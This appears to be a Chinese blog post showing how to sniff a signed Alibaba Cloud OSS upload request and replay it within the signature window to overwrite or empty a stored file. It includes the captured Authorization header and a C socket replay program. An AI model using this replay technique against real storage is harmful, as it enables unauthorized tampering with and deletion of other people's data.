@@ -1,0 +1,124 @@
+今天无聊做了个无聊的实验. 网络嗅探到HTTP 签名数据包, 然后在此基础上进行修改, 我们来看一下
+
+首先从阿里云官网站上下载osscmd
+上传一个文件
+./osscmd --id=XXX --key=XXX --host=XXX put file_name oss://larry-page2--a/file_name
+file_name 里面存放内容为 "haha"
+在osscmd 运行时进行抓包, 捕捉到所有的http 包
+运行命令:sudo tcpdump tcp port 80 -n -s 0 -w /tmp/tcp.cap
+然后打开/tmp/tcp.cap 找到HTTP 请求头部, 很容易找到这个东西
+PUT /larry-page2--a/crontab HTTP/1.1
+Host: 10.101.162.192
+Accept-Encoding: identity
+Content-Length: 5
+User-Agent: oss-python0.3.5 (linux2)
+Host: 10.101.162.192
+Expect: 100-Continue
+Date: Tue, 30 Dec 2014 03:45:34 GMT
+Content-Type: application/octet-stream
+Authorization: OSS 15h20xmfv49qmim5pv8p85ez:CPbJXBSdqx4FDNWkGimtIoVIh/c=
+
+然后将在此基础上做文章, 由于阿里云OSS一次签名可以在15分钟内生效, 所以我们在15分钟之内进行这样的操作都是没有问题的.
+
+然后将HTTP 请求放到sendbuf中(具体见下面代码):
+sprintf(sendbuf, "PUT /larry-page2--a/file_name HTTP/1.1\r\nHost: 10.101.162.192\r\nAccept-Encoding: identity\r\nContent-Length: 5\r\nUser-Agent: oss-python0.3.5 (linux2)\r\nHost: 10.101.162.192\r\nExpect: 100-Continue\r\nDate: Tue, 30 Dec 2014 03:45:34 GMT\r\nContent-Type: application/octet-stream\r\nAuthorization: OSS 15h20xmfv49qmim5pv8p85ez:CPbJXBSdqx4FDNWkGimtIoVIh/c=\r\n\r\nhaha");
+
+完成之后编译运行, 我们可以看到服务器返回200 OK
+
+接下来我们想把这个文件清空:
+我们只要将 Content-Length: 0
+然后再编译运行 服务器返回OK
+接下来我们看看服务器上的文件内容是否被改变, 我们可以下载下来看看
+./osscmd --id=XXX --key=XXX --host=XXX get oss://larry-page2--a/file_name file_name1
+发现真为空, 这样文件就相当于被我们给删除了, 其实比较简单, 因为整个签名的部分只有时间会变
+其他的都是不变的, 只要能嗅探到这样的包, 我们就可以在15分钟之内做删除更改的事情. 
+
+程序:
+#include <stdio.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <syslog.h>
+#include <errno.h>
+#include <stdlib.h>
+#define MAX_LISTEN_NUM 5
+#define SEND_BUF_SIZE 10000
+#define RECV_BUF_SIZE 1000000
+#define SERVER_PORT 80
+int main()
+{
+    int sock_fd = 0;
+    char recvbuf[RECV_BUF_SIZE] = {0};
+    char sendbuf[SEND_BUF_SIZE] = {0};
+    int recvlen = 0;
+    int retlen = 0;
+    int sendlen = 0;
+    int leftlen = 0;
+    char *ptr = NULL;
+    struct sockaddr_in ser_addr;
+
+    memset(&ser_addr, 0, sizeof(ser_addr));
+    ser_addr.sin_family = AF_INET;
+    inet_aton("10.101.162.192", (struct in_addr *)&ser_addr.sin_addr);
+    ser_addr.sin_port = htons(SERVER_PORT);
+    sock_fd = socket(AF_INET, SOCK_STREAM, 0);
+    if(sock_fd < 0)
+    {
+        printf("%s:%d, create socket failed", __FILE__, __LINE__);
+        exit(1);
+    }
+    if(connect(sock_fd, (struct sockaddr *)&ser_addr, sizeof(ser_addr)) < 0)
+    {
+        printf("%s:%d, connect socket failed", __FILE__, __LINE__);
+        exit(1);
+    }
+    //receive data
+    sprintf(sendbuf, "PUT /larry-page2--a/crontab HTTP/1.1\r\nHost: 10.101.162.192\r\nAccept-Encoding: identity\r\nContent-Length: 5\r\nUser-Agent: oss-python0.3.5 (linux2)\r\nHost: 10.101.162.192\r\nExpect: 100-Continue\r\nDate: Tue, 30 Dec 2014 03:45:34 GMT\r\nContent-Type: application/octet-stream\r\nAuthorization: OSS 15h20xmfv49qmim5pv8p85ez:CPbJXBSdqx4FDNWkGimtIoVIh/c=\r\n\r\nhaha");
+    printf("%s\n", sendbuf);
+    //send data
+    sendlen = strlen(sendbuf) +1;
+    retlen = 0;
+    leftlen = sendlen;
+    ptr = sendbuf;
+    while(leftlen)
+    {
+        retlen = send(sock_fd, ptr, sendlen, 0);
+        if(retlen < 0)
+        {
+            if(errno == EINTR)
+                retlen = 0;
+            else
+                exit(1);
+        }
+        leftlen -= retlen;
+        ptr += retlen;
+    }
+
+    recvlen = 0;
+    retlen = 0;
+    ptr = recvbuf;
+    leftlen = RECV_BUF_SIZE -1;
+
+    do
+    {
+        retlen = recv(sock_fd, ptr, leftlen, 0) ;
+        if(retlen < 0)
+        {
+            if(errno == EINTR)
+                retlen = 0;
+            else
+                exit(1);
+        }
+        recvlen += retlen;
+        leftlen -= retlen;
+        ptr += retlen;
+        if(retlen == 0)
+            break;
+    }
+    while(recvlen && leftlen);
+    printf("receive data is : %s", recvbuf);
+    close(sock_fd);
+
+}
+
+
